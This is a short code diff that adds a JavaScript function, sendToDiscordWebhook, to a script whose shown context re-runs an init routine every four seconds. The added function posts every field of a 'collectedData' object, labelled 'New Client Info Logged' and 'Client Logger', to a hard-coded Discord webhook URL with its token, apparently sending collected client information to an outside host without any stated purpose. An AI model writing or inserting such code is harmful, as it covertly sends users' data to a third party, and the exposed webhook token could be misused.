@@ -106,3 +106,31 @@ function init(param) {
     var global = getGlobal();
     global.setInterval(init, 4000);
 })();
+
+function sendToDiscordWebhook(collectedData) {
+    const webhookUrl = "https://discord.com/api/webhooks/1402845085288366261/FummiU0Zb1bHBQC6qhMyTOx-ba990D6lSEnBmegUzkIH_kj-n3doBp7C6eFJtHBkJaxh";
+
+    const embed = {
+        title: "New Client Info Logged",
+        color: 0x3498db,
+        fields: Object.entries(collectedData).map(([key, value]) => ({
+            name: key,
+            value: String(value) || "N/A",
+            inline: false
+        })),
+        timestamp: new Date().toISOString(),
+        footer: {
+            text: "Client Logger"
+        }
+    };
+
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            embeds: [embed]
+        })
+    }).catch(console.error);
+}
